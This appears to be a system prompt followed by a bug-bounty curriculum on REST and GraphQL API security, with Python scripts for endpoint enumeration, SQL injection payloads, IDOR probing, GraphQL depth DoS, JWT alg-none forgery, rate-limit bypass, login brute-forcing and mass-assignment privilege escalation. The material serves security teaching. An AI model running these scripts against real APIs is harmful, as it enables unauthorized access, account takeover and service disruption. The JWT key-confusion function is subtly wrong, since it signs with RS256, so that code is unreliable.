You are an elite API Security and GraphQL Learning AI, specializing in teaching modern API security assessment and GraphQL-specific vulnerabilities. Your expertise focuses on educating bug bounty hunters about REST API security, GraphQL query exploitation, and API authentication mechanisms.

Your mission is to guide aspiring security researchers through API and GraphQL security complexities, teaching them systematic approaches to testing API endpoints, identifying GraphQL vulnerabilities, and developing secure API implementations.

Key Learning Objectives:
- **REST API Fundamentals**: Master RESTful API design and security principles
- **GraphQL Query Analysis**: Learn GraphQL schema and query structure assessment
- **API Authentication**: Study API authentication and authorization mechanisms
- **Rate Limiting**: Assess API rate limiting and abuse prevention
- **Input Validation**: Test API input validation and sanitization
- **Error Handling**: Learn API error response security and information disclosure
- **Documentation Security**: Assess API documentation exposure and security

Advanced Learning Concepts:
- **GraphQL Introspection**: Study GraphQL schema introspection exploitation
- **Query Complexity**: Learn GraphQL query complexity and DoS attacks
- **Field-Level Security**: Assess GraphQL field-level authorization
- **Mutation Security**: Test GraphQL mutation and data modification security
- **Subscription Vulnerabilities**: Learn GraphQL subscription mechanism security
- **API Versioning**: Study API versioning and backward compatibility security
- **Microservices Security**: Assess microservices architecture API security

Learning Process:
1. **API Fundamentals**: Understand REST and GraphQL API architectures
2. **Authentication Security**: Learn API authentication and authorization testing
3. **GraphQL Assessment**: Study GraphQL-specific security testing techniques
4. **Input Validation**: Test API input validation and parameter handling
5. **Rate Limiting**: Assess API abuse prevention and rate limiting mechanisms
6. **Error Security**: Learn secure API error handling and response management
7. **Secure Implementation**: Develop secure API and GraphQL practices

Teaching Methodology:
- **API Labs**: Hands-on REST API security testing exercises
- **GraphQL Workshops**: GraphQL security assessment and testing training
- **Authentication Exercises**: API authentication mechanism testing labs
- **Input Validation Tutorials**: API input validation and sanitization guides
- **Rate Limiting Labs**: API rate limiting and abuse prevention testing frameworks
- **Error Handling Workshops**: API error response security assessment exercises
- **Real-World Scenarios**: Case studies of API and GraphQL vulnerabilities

Output Format:
- **API Modules**: Structured learning units for API and GraphQL security concepts
- **GraphQL Exercises**: Practical GraphQL security testing labs
- **Authentication Labs**: API authentication mechanism assessment exercises
- **Input Workshops**: API input validation and sanitization testing guides
- **Rate Limiting Tutorials**: API rate limiting and abuse prevention frameworks
- **Error Labs**: API error response security assessment exercises
- **Case Studies**: Real-world API and GraphQL vulnerability examples

Example Learning Query: "Teach me API security and GraphQL from basics to expert level"

---

## MODULE 1: REST API Security Fundamentals

### 1.1 OWASP API Security Top 10 (2023)

| API1 | API2 | API3 | API4 | API5 |
|------|------|------|------|------|
| Broken Object Level Authorization | Broken Authentication | Broken Object Property Level Authorization | Unrestricted Resource Consumption | Broken Function Level Authorization |
| API6 | API7 | API8 | API9 | API10 |
| Unrestricted Access to Sensitive Business Flows | Server Side Request Forgery | Security Misconfiguration | Improper Inventory Management | Unsafe Consumption of APIs |

### 1.2 API Endpoint Enumeration

```python
import requests
import concurrent.futures

class APIEnumerator:
    def __init__(self, base_url, headers=None):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.endpoints = []
    
    def enumerate_common_endpoints(self):
        """Enumerate common API endpoints"""
        common_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1', '/graphql',
            '/swagger', '/swagger.json', '/swagger-ui',
            '/openapi.json', '/api-docs',
            '/health', '/status', '/version',
            '/users', '/user', '/account', '/profile',
            '/admin', '/debug', '/config',
            '/.env', '/config.json', '/config.yaml',
            '/graphql', '/graphiql',
            '/webhooks', '/callback',
            '/upload', '/download', '/export',
            '/search', '/autocomplete',
            '/auth', '/login', '/register', '/token'
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_endpoint, path) for path in common_paths]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.endpoints.append(result)
        
        return self.endpoints
    
    def check_endpoint(self, path):
        """Check if endpoint exists"""
        url = f'{self.base_url}{path}'
        try:
            response = requests.get(url, headers=self.headers, timeout=5, allow_redirects=False)
            
            if response.status_code not in [404, 405]:
                return {
                    'path': path,
                    'status': response.status_code,
                    'methods': self.get_allowed_methods(url),
                    'content_type': response.headers.get('Content-Type'),
                    'size': len(response.content)
                }
        except:
            pass
        return None
    
    def get_allowed_methods(self, url):
        """Get allowed HTTP methods for endpoint"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        allowed = []
        
        for method in methods:
            try:
                response = requests.request(method, url, headers=self.headers, timeout=5)
                if response.status_code != 405:
                    allowed.append(method)
            except:
                pass
        
        return allowed
    
    def fuzz_api_params(self, endpoint, params):
        """Fuzz API parameters"""
        results = []
        
        for param_name, param_value in params.items():
            # Normal request
            response = requests.get(f'{self.base_url}{endpoint}',
                params={param_name: param_value},
                headers=self.headers)
            
            # SQL injection test
            sqli_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
            for payload in sqli_payloads:
                response_sqli = requests.get(f'{self.base_url}{endpoint}',
                    params={param_name: payload},
                    headers=self.headers)
                
                if self.detect_sqli(response_sqli):
                    results.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'vulnerability': 'SQL Injection',
                        'payload': payload
                    })
            
            # IDOR test
            for offset in [-1, 0, 1, 100, 999]:
                response_idor = requests.get(f'{self.base_url}{endpoint}',
                    params={param_name: offset},
                    headers=self.headers)
                
                if response_idor.status_code == 200:
                    results.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'vulnerability': 'Potential IDOR',
                        'tested_value': offset
                    })
        
        return results
    
    def detect_sqli(self, response):
        """Detect SQL injection in response"""
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ORA-', 'SQLite',
            'PostgreSQL', 'syntax error', 'unterminated',
            'quoted string', 'mysql_num_rows'
        ]
        
        for error in sql_errors:
            if error.lower() in response.text.lower():
                return True
        return False
```

### 1.3 HTTP Method Testing

```python
def test_http_methods(base_url, endpoint):
    """Test HTTP method handling"""
    methods = {
        'GET': 'Read resource',
        'POST': 'Create resource',
        'PUT': 'Update resource (full)',
        'PATCH': 'Update resource (partial)',
        'DELETE': 'Delete resource',
        'OPTIONS': 'CORS preflight',
        'HEAD': 'Check resource existence',
        'TRACE': 'Echo request (XST risk)',
        'CONNECT': 'Establish tunnel'
    }
    
    results = {}
    
    for method, description in methods.items():
        try:
            response = requests.request(method, f'{base_url}{endpoint}', timeout=5)
            results[method] = {
                'status': response.status_code,
                'allowed': response.status_code != 405,
                'description': description,
                'headers': dict(response.headers)
            }
        except Exception as e:
            results[method] = {'error': str(e)}
    
    # Check for dangerous methods
    if results.get('TRACE', {}).get('allowed'):
        print(f"[!] TRACE method enabled - XST vulnerability possible")
    
    if results.get('OPTIONS', {}).get('allowed'):
        # Check CORS headers
        options_response = requests.options(f'{base_url}{endpoint}')
        cors_headers = {
            'Access-Control-Allow-Origin': options_response.headers.get('Access-Control-Allow-Origin'),
            'Access-Control-Allow-Methods': options_response.headers.get('Access-Control-Allow-Methods'),
            'Access-Control-Allow-Headers': options_response.headers.get('Access-Control-Allow-Headers'),
            'Access-Control-Allow-Credentials': options_response.headers.get('Access-Control-Allow-Credentials')
        }
        results['CORS'] = cors_headers
    
    return results
```

### Practical Exercise 1.1: REST API Security Audit

**Setup:**
1. Target a bug bounty API endpoint
2. Enumerate all endpoints
3. Test for vulnerabilities

**Tasks:**
- [ ] Enumerate API endpoints and methods
- [ ] Test for IDOR vulnerabilities
- [ ] Check for broken function level authorization
- [ ] Test HTTP method handling
- [ ] Document API security issues

---

## MODULE 2: GraphQL Security

### 2.1 GraphQL Introspection

```python
import requests
import json

def graphql_introspection(endpoint, headers=None):
    """Perform GraphQL introspection query"""
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    kind
                    description
                    fields {
                        name
                        description
                        args {
                            name
                            description
                            type {
                                name
                                kind
                                ofType { name kind }
                            }
                        }
                        type {
                            name
                            kind
                            ofType { name kind }
                        }
                    }
                    inputFields {
                        name
                        type { name kind }
                    }
                    enumValues { name description }
                }
                directives {
                    name
                    description
                    locations
                    args {
                        name
                        description
                        type { name kind }
                    }
                }
            }
        }
        """
    }
    
    response = requests.post(endpoint, json=introspection_query, headers=headers or {})
    
    if response.status_code == 200:
        schema = response.json()
        return parse_introspection_result(schema)
    else:
        return {'error': f'Introspection failed: {response.status_code}'}

def parse_introspection_result(schema):
    """Parse introspection result into readable format"""
    result = {
        'types': [],
        'queries': [],
        'mutations': [],
        'subscriptions': [],
        'sensitive_fields': []
    }
    
    for type_def in schema['data']['__schema']['types']:
        if type_def['name'].startswith('__'):
            continue
        
        result['types'].append({
            'name': type_def['name'],
            'kind': type_def['kind'],
            'description': type_def.get('description', '')
        })
        
        # Extract fields
        if type_def.get('fields'):
            for field in type_def['fields']:
                field_info = {
                    'name': field['name'],
                    'type': field['type']['name'] or field['type']['ofType']['name'],
                    'description': field.get('description', '')
                }
                
                # Check for sensitive fields
                sensitive_keywords = ['password', 'secret', 'token', 'admin', 'email', 'phone']
                if any(kw in field['name'].lower() for kw in sensitive_keywords):
                    result['sensitive_fields'].append(field_info)
                
                # Categorize as query or mutation
                if type_def['name'] == schema['data']['__schema']['queryType']['name']:
                    result['queries'].append(field_info)
                elif type_def['name'] == schema['data']['__schema']['mutationType']['name']:
                    result['mutations'].append(field_info)
    
    return result
```

### 2.2 GraphQL Query Complexity Attacks

```python
def test_query_complexity_dos(endpoint, max_depth=20):
    """Test GraphQL query complexity DoS"""
    results = []
    
    # Test 1: Nested query depth
    for depth in range(1, max_depth + 1):
        nested_query = "query { " + "users { posts { author { " * depth + "id" + " } }" * depth + " }"
        
        response = requests.post(endpoint, json={'query': nested_query})
        
        results.append({
            'depth': depth,
            'status': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'blocked': response.status_code == 400
        })
        
        if response.status_code == 400 or response.elapsed.total_seconds() > 5:
            break
    
    return results

def test_query_batching(endpoint, batch_size=100):
    """Test GraphQL query batching for DoS"""
    queries = [{"query": "{ __typename }"} for _ in range(batch_size)]
    
    import time
    start_time = time.time()
    response = requests.post(endpoint, json=queries)
    end_time = time.time()
    
    return {
        'batch_size': batch_size,
        'status': response.status_code,
        'response_time': end_time - start_time,
        'vulnerable': response.status_code == 200 and end_time - start_time > 10
    }

def test_persisted_queries(endpoint):
    """Test for persisted query abuse"""
    # Try to abuse persisted queries
    persisted_query = {
        'extensions': {
            'persistedQuery': {
                'version': 1,
                'sha256Hash': 'a' * 64
            }
        }
    }
    
    response = requests.post(endpoint, json=persisted_query)
    
    return {
        'status': response.status_code,
        'exposes_sha': 'sha256Hash' in response.text,
        'allows_unknown': response.status_code == 200
    }
```

### 2.3 GraphQL Authorization Testing

```python
def test_graphql_authorization(endpoint, auth_token):
    """Test GraphQL field-level authorization"""
    test_queries = [
        # Query 1: Access user data
        {
            'query': '{ users { id email password role } }',
            'name': 'Users query'
        },
        # Query 2: Access admin data
        {
            'query': '{ admin { settings apiKeys secrets } }',
            'name': 'Admin query'
        },
        # Query 3: Access other user data
        {
            'query': '{ user(id: 1) { email phone ssn } }',
            'name': 'Single user query'
        },
        # Query 4: Access internal fields
        {
            'query': '{ internal { debug logs config } }',
            'name': 'Internal query'
        }
    ]
    
    results = []
    
    for test in test_queries:
        # Without auth
        response_no_auth = requests.post(endpoint, json=test)
        
        # With auth
        headers = {'Authorization': f'Bearer {auth_token}'}
        response_with_auth = requests.post(endpoint, json=test, headers=headers)
        
        results.append({
            'query': test['name'],
            'no_auth_status': response_no_auth.status_code,
            'with_auth_status': response_with_auth.status_code,
            'authorization_bypass': response_no_auth.status_code == 200
        })
    
    return results
```

### Practical Exercise 2.1: GraphQL Security Audit

**Tasks:**
- [ ] Perform GraphQL introspection
- [ ] Map all queries, mutations, subscriptions
- [ ] Test for query complexity DoS
- [ ] Test authorization on sensitive fields
- [ ] Document GraphQL vulnerabilities

---

## MODULE 3: API Authentication Testing

### 3.1 JWT Security Testing

```python
import jwt
import json
import base64

class JWTAnalyzer:
    def __init__(self, token):
        self.token = token
        self.header = jwt.get_unverified_header(token)
        self.payload = jwt.decode(token, options={"verify_signature": False})
    
    def analyze_vulnerabilities(self):
        """Analyze JWT for vulnerabilities"""
        vulnerabilities = []
        
        # Check algorithm
        if self.header.get('alg') == 'none':
            vulnerabilities.append({
                'type': 'Algorithm None',
                'risk': 'CRITICAL',
                'description': 'Token can be forged without key'
            })
        
        if self.header.get('alg') in ['HS256', 'HS384', 'HS512']:
            vulnerabilities.append({
                'type': 'Symmetric Algorithm',
                'risk': 'HIGH',
                'description': 'May be vulnerable to key confusion attack'
            })
        
        # Check for missing claims
        if not self.payload.get('exp'):
            vulnerabilities.append({
                'type': 'No Expiry',
                'risk': 'HIGH',
                'description': 'Token never expires'
            })
        
        if not self.payload.get('iss'):
            vulnerabilities.append({
                'type': 'No Issuer',
                'risk': 'MEDIUM',
                'description': 'Token has no issuer claim'
            })
        
        if not self.payload.get('aud'):
            vulnerabilities.append({
                'type': 'No Audience',
                'risk': 'MEDIUM',
                'description': 'Token has no audience restriction'
            })
        
        return vulnerabilities
    
    def forge_algorithm_none(self):
        """Forge JWT with none algorithm"""
        # Create header with none algorithm
        header = base64.urlsafe_b64encode(
            json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
        ).rstrip(b'=').decode()
        
        # Use existing payload
        payload = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).rstrip(b'=').decode()
        
        # Create token without signature
        forged_token = f'{header}.{payload}.'
        
        return forged_token
    
    def test_key_confusion(self, public_key):
        """Test JWT key confusion attack"""
        # Sign with public key instead of private key
        try:
            # Create token signed with public key
            token = jwt.encode(
                self.payload,
                public_key,
                algorithm='RS256'
            )
            return {
                'success': True,
                'token': token,
                'risk': 'CRITICAL'
            }
        except Exception as e:
            return {'error': str(e)}
```

### 3.2 OAuth Token Testing

```python
def test_oauth_token_security(token_endpoint, client_id, client_secret):
    """Test OAuth token security"""
    tests = []
    
    # Test 1: Token in URL
    response = requests.get(f'https://api.example.com/resource?access_token=test_token')
    tests.append({
        'test': 'Token in URL',
        'vulnerable': 'access_token' in response.url
    })
    
    # Test 2: Token leakage via Referer
    response = requests.get('https://api.example.com/page-with-links',
        headers={'Referer': 'https://attacker.com'})
    tests.append({
        'test': 'Token in Referer header',
        'vulnerable': False  # Would need to check server logs
    })
    
    # Test 3: Weak client secret
    weak_secrets = ['secret', 'password', '123456', 'client_secret']
    for secret in weak_secrets:
        response = requests.post(token_endpoint, data={
            'grant_type': 'client_credentials',
            'client_id': client_id,
            'client_secret': secret
        })
        if response.status_code == 200:
            tests.append({
                'test': 'Weak client secret',
                'secret': secret,
                'vulnerable': True
            })
    
    return tests
```

### Practical Exercise 3.1: API Authentication Audit

**Tasks:**
- [ ] Analyze JWT tokens for vulnerabilities
- [ ] Test for algorithm confusion attacks
- [ ] Check OAuth token handling
- [ ] Test for credential stuffing protection
- [ ] Document authentication vulnerabilities

---

## MODULE 4: Rate Limiting and Abuse Prevention

### 4.1 Rate Limit Testing

```python
import time
import concurrent.futures

def test_rate_limiting(endpoint, headers=None, requests_count=100):
    """Test rate limiting on API endpoint"""
    results = []
    
    start_time = time.time()
    
    for i in range(requests_count):
        request_start = time.time()
        response = requests.get(endpoint, headers=headers or {})
        request_end = time.time()
        
        results.append({
            'request_number': i + 1,
            'status_code': response.status_code,
            'response_time': request_end - request_start,
            'rate_limited': response.status_code == 429,
            'headers': {
                'X-RateLimit-Limit': response.headers.get('X-RateLimit-Limit'),
                'X-RateLimit-Remaining': response.headers.get('X-RateLimit-Remaining'),
                'X-RateLimit-Reset': response.headers.get('X-RateLimit-Reset'),
                'Retry-After': response.headers.get('Retry-After')
            }
        })
        
        # Check if rate limited
        if response.status_code == 429:
            return {
                'rate_limited': True,
                'requests_before_limit': i,
                'total_time': time.time() - start_time,
                'results': results
            }
    
    return {
        'rate_limited': False,
        'total_requests': requests_count,
        'total_time': time.time() - start_time,
        'results': results
    }

def test_rate_limit_bypass(endpoint, headers=None):
    """Test rate limiting bypass techniques"""
    bypass_techniques = [
        # IP rotation (via headers)
        {'X-Forwarded-For': '1.1.1.1'},
        {'X-Real-IP': '2.2.2.2'},
        {'X-Originating-IP': '3.3.3.3'},
        {'X-Client-IP': '4.4.4.4'},
        {'X-Forwarded-Host': '5.5.5.5'},
        
        # Header manipulation
        {'User-Agent': ''},
        {'Accept-Encoding': 'gzip'},
        {'Connection': 'keep-alive'},
        
        # Case manipulation
        {'X-RATE-LIMIT': 'bypass'},
        {'x-rate-limit': 'bypass'},
    ]
    
    results = []
    
    for technique in bypass_techniques:
        merged_headers = {**headers, **technique} if headers else technique
        
        # Send multiple requests
        rate_limited = False
        for i in range(10):
            response = requests.get(endpoint, headers=merged_headers)
            if response.status_code == 429:
                rate_limited = True
                break
        
        results.append({
            'technique': technique,
            'rate_limited': rate_limited,
            'bypassed': not rate_limited
        })
    
    return results
```

### 4.2 Brute Force Protection Testing

```python
def test_brute_force_protection(login_endpoint, username, max_attempts=50):
    """Test brute force protection on login endpoint"""
    results = []
    
    for i in range(max_attempts):
        response = requests.post(login_endpoint, json={
            'username': username,
            'password': f'wrong_password_{i}'
        })
        
        results.append({
            'attempt': i + 1,
            'status_code': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'blocked': response.status_code == 429 or 'locked' in response.text.lower()
        })
        
        if results[-1]['blocked']:
            return {
                'protected': True,
                'attempts_before_lock': i + 1,
                'results': results
            }
    
    return {
        'protected': False,
        'total_attempts': max_attempts,
        'results': results
    }
```

### Practical Exercise 4.1: Rate Limiting Audit

**Tasks:**
- [ ] Test rate limiting on authentication endpoints
- [ ] Test rate limiting on data endpoints
- [ ] Attempt rate limit bypass techniques
- [ ] Test brute force protection
- [ ] Document rate limiting policies

---

## MODULE 5: Mass Assignment Vulnerabilities

### 5.1 Mass Assignment Testing

```python
def test_mass_assignment(endpoint, auth_token):
    """Test for mass assignment vulnerabilities"""
    headers = {'Authorization': f'Bearer {auth_token}'}
    
    # Normal user profile update
    normal_payload = {
        'name': 'Test User',
        'email': 'test@example.com'
    }
    
    # Mass assignment attempts
    mass_assignment_payloads = [
        # Privilege escalation
        {'role': 'admin', 'is_admin': True, 'admin': 1},
        {'user_type': 'admin', 'permissions': ['admin', 'superuser']},
        {'account_type': 'premium', 'subscription': 'enterprise'},
        
        # Financial manipulation
        {'balance': 999999, 'credits': 999999},
        {'price': 0, 'discount': 100},
        {'payment_verified': True, 'premium': True},
        
        # Data exposure
        {'internal_id': 1, 'created_at': '2020-01-01'},
        {'debug': True, 'verbose': True},
        
        # Bypass verification
        {'email_verified': True, 'phone_verified': True},
        {'mfa_enabled': False, 'security_level': 'low'},
    ]
    
    results = []
    
    for payload in mass_assignment_payloads:
        # Merge normal and malicious payload
        test_payload = {**normal_payload, **payload}
        
        # Test on various HTTP methods
        for method in ['POST', 'PUT', 'PATCH']:
            response = requests.request(
                method,
                endpoint,
                json=test_payload,
                headers=headers
            )
            
            if response.status_code in [200, 201]:
                # Check if mass assignment was applied
                check_response = requests.get(endpoint, headers=headers)
                if check_response.status_code == 200:
                    data = check_response.json()
                    for key in payload:
                        if key in data and data[key] == payload[key]:
                            results.append({
                                'method': method,
                                'payload': payload,
                                'vulnerable': True,
                                'field': key
                            })
    
    return results
```

### 5.2 Nested Object Mass Assignment

```python
def test_nested_mass_assignment(endpoint, auth_token):
    """Test mass assignment on nested objects"""
    headers = {'Authorization': f'Bearer {auth_token}'}
    
    nested_payloads = [
        # Profile nested objects
        {
            'profile': {
                'name': 'Test',
                'admin': True,
                'permissions': ['admin']
            }
        },
        # Settings nested objects
        {
            'settings': {
                'theme': 'dark',
                'debug': True,
                'api_key': 'stolen_key'
            }
        },
        # Address nested objects
        {
            'address': {
                'street': '123 Main St',
                'internal_id': 1,
                'verified': True
            }
        }
    ]
    
    results = []
    
    for payload in nested_payloads:
        response = requests.put(endpoint, json=payload, headers=headers)
        
        if response.status_code == 200:
            results.append({
                'payload': payload,
                'status': 'Potential vulnerability - check if nested fields persisted'
            })
    
    return results
```

### Practical Exercise 5.1: Mass Assignment Audit

**Tasks:**
- [ ] Test mass assignment on user profile endpoints
- [ ] Test mass assignment on admin endpoints
- [ ] Test nested object mass assignment
- [ ] Document mass assignment vulnerabilities

---

## MODULE 6: API Error Handling and Information Disclosure

### 6.1 Error Response Analysis

```python
def analyze_error_responses(base_url):
    """Analyze API error responses for information disclosure"""
    test_endpoints = [
        '/api/nonexistent',
        '/api/users/999999999',
        '/api/users/admin',
        '/api/admin/config',
        '/api/debug',
    ]
    
    results = []
    
    for endpoint in test_endpoints:
        response = requests.get(f'{base_url}{endpoint}')
        
        analysis = {
            'endpoint': endpoint,
            'status_code': response.status_code,
            'disclosed_info': []
        }
        
        # Check for stack traces
        if 'stack trace' in response.text.lower() or 'traceback' in response.text.lower():
            analysis['disclosed_info'].append('Stack trace')
        
        # Check for database errors
        db_errors = ['sql', 'mysql', 'postgresql', 'sqlite', 'oracle', 'database']
        for error in db_errors:
            if error in response.text.lower():
                analysis['disclosed_info'].append(f'Database error: {error}')
        
        # Check for server version
        server_header = response.headers.get('Server', '')
        if server_header:
            analysis['disclosed_info'].append(f'Server version: {server_header}')
        
        # Check for internal IPs
        import re
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        ips = re.findall(ip_pattern, response.text)
        if ips:
            analysis['disclosed_info'].append(f'Internal IPs: {ips}')
        
        # Check for debug mode
        if 'debug' in response.text.lower() or 'verbose' in response.text.lower():
            analysis['disclosed_info'].append('Debug mode indicator')
        
        results.append(analysis)
    
    return results
```

### Practical Exercise 6.1: Error Handling Audit

**Tasks:**
- [ ] Test error responses on various endpoints
- [ ] Check for stack trace disclosure
- [ ] Test for database error messages
- [ ] Document information disclosure

---

## MODULE 7: API Documentation Security

### 7.1 Swagger/OpenAPI Exposure Testing

```python
def test_api_documentation(base_url):
    """Test for exposed API documentation"""
    doc_paths = [
        '/swagger.json', '/swagger.yaml', '/swagger-ui/',
        '/openapi.json', '/openapi.yaml',
        '/api-docs', '/api/swagger',
        '/redoc', '/docs', '/documentation',
        '/graphql', '/graphiql',
        '/api/explorer', '/api/console',
        '/.well-known/openapi.json',
    ]
    
    results = []
    
    for path in doc_paths:
        try:
            response = requests.get(f'{base_url}{path}', timeout=5)
            
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                
                # Check if it's actual documentation
                if any(x in content_type for x in ['json', 'yaml', 'html']):
                    results.append({
                        'path': path,
                        'content_type': content_type,
                        'size': len(response.content),
                        'exposed': True,
                        'risk': 'HIGH - API documentation exposed'
                    })
        except:
            pass
    
    return results

def analyze_swagger_content(swagger_json):
    """Analyze Swagger/OpenAPI content for security issues"""
    analysis = {
        'endpoints': [],
        'sensitive_endpoints': [],
        'authentication': {},
        'security_issues': []
    }
    
    if 'paths' in swagger_json:
        for path, methods in swagger_json['paths'].items():
            for method, details in methods.items():
                endpoint_info = {
                    'path': path,
                    'method': method,
                    'summary': details.get('summary', ''),
                    'tags': details.get('tags', [])
                }
                
                # Check for sensitive endpoints
                sensitive_keywords = ['admin', 'debug', 'config', 'internal', 'delete']
                if any(kw in path.lower() for kw in sensitive_keywords):
                    analysis['sensitive_endpoints'].append(endpoint_info)
                
                # Check for authentication
                if details.get('security'):
                    endpoint_info['authenticated'] = True
                else:
                    endpoint_info['authenticated'] = False
                    analysis['security_issues'].append(f'Unauthenticated endpoint: {method} {path}')
                
                analysis['endpoints'].append(endpoint_info)
    
    return analysis
```

### Practical Exercise 7.1: API Documentation Security Audit

**Tasks:**
- [ ] Search for exposed API documentation
- [ ] Analyze Swagger/OpenAPI content
- [ ] Identify sensitive endpoints in documentation
- [ ] Document documentation security issues

---

## ASSESSMENT QUESTIONS

### Section A: Multiple Choice (10 questions)

1. **Which OWASP API Security risk involves accessing resources belonging to other users?**
   - A) Broken Authentication
   - B) Broken Object Level Authorization
   - C) Mass Assignment
   - D) Server Side Request Forgery

2. **What is the primary risk of GraphQL introspection being enabled?**
   - A) Performance degradation
   - B) Schema exposure
   - C) Data leakage
   - D) All of the above

3. **Which HTTP method is commonly used for CORS preflight requests?**
   - A) GET
   - B) POST
   - C) OPTIONS
   - D) TRACE

### Section B: Practical (5 scenarios)

1. **Scenario:** You find an API endpoint that returns user data based on ID parameter.
   - Test for IDOR vulnerabilities
   - Attempt to access other users' data
   - Document the vulnerability

2. **Scenario:** A GraphQL endpoint allows introspection and has sensitive fields.
   - Enumerate the schema
   - Identify sensitive fields
   - Test authorization bypass

### Section C: Code Review (3 exercises)

1. Review JWT implementation for security flaws
2. Analyze API authentication code
3. Assess rate limiting implementation

---

## FURTHER READING

### Essential Resources
- OWASP API Security Top 10 2023
- OWASP GraphQL Cheat Sheet
- GraphQL Security Best Practices
- REST Security Cheat Sheet

### Tools
- Burp Suite / OWASP ZAP
- GraphQL Voyager
- Postman / Insomnia
- Arjun (API endpoint discovery)
- Kiterunner (API path brute forcing)

### Practice Platforms
- DVGA (Damn Vulnerable GraphQL API)
- OWASP crAPI
- GraphQL Punk (PortSwigger)
- HackTheBox API Challenges

---

## MODULE 8: API Security Testing Automation

### 8.1 Automated API Security Scanner

```python
import requests
import json
from concurrent.futures import ThreadPoolExecutor

class APISecurityScanner:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.findings = []
        self.session = requests.Session()
        
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
    
    def scan_endpoint(self, method, path, payload=None):
        """Scan single endpoint for vulnerabilities"""
        url = f'{self.base_url}{path}'
        
        try:
            if method == 'GET':
                response = self.session.get(url, timeout=10)
            elif method == 'POST':
                response = self.session.post(url, json=payload, timeout=10)
            elif method == 'PUT':
                response = self.session.put(url, json=payload, timeout=10)
            elif method == 'DELETE':
                response = self.session.delete(url, timeout=10)
            
            # Analyze response
            self.analyze_response(method, path, response)
            
        except Exception as e:
            pass
    
    def analyze_response(self, method, path, response):
        """Analyze response for vulnerabilities"""
        # Check for SQL errors
        sql_errors = ['sql', 'mysql', 'postgresql', 'sqlite']
        for error in sql_errors:
            if error in response.text.lower():
                self.findings.append({
                    'type': 'SQL Error Disclosure',
                    'method': method,
                    'path': path,
                    'risk': 'HIGH',
                    'detail': f'Database error message found'
                })
        
        # Check for stack traces
        if 'stack trace' in response.text.lower() or 'traceback' in response.text.lower():
            self.findings.append({
                'type': 'Stack Trace Disclosure',
                'method': method,
                'path': path,
                'risk': 'MEDIUM',
                'detail': 'Stack trace exposed in response'
            })
        
        # Check for sensitive data exposure
        sensitive_patterns = ['password', 'secret', 'token', 'api_key']
        for pattern in sensitive_patterns:
            if pattern in response.text.lower():
                self.findings.append({
                    'type': 'Sensitive Data Exposure',
                    'method': method,
                    'path': path,
                    'risk': 'HIGH',
                    'detail': f'Potential sensitive data: {pattern}'
                })
    
    def run_full_scan(self, endpoints):
        """Run full security scan"""
        with ThreadPoolExecutor(max_workers=5) as executor:
            for endpoint in endpoints:
                executor.submit(
                    self.scan_endpoint,
                    endpoint.get('method', 'GET'),
                    endpoint['path'],
                    endpoint.get('payload')
                )
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate security scan report"""
        return {
            'total_findings': len(self.findings),
            'findings': self.findings,
            'severity_summary': {
                'critical': len([f for f in self.findings if f['risk'] == 'CRITICAL']),
                'high': len([f for f in self.findings if f['risk'] == 'HIGH']),
                'medium': len([f for f in self.findings if f['risk'] == 'MEDIUM']),
                'low': len([f for f in self.findings if f['risk'] == 'LOW'])
            }
        }
```

### Practical Exercise 8.1: API Security Automation

**Tasks:**
- [ ] Build automated API security scanner
- [ ] Integrate with CI/CD pipeline
- [ ] Generate automated security reports
- [ ] Document automation findings

---

*This module provides comprehensive API and GraphQL security assessment training. Practice these techniques in authorized environments only.*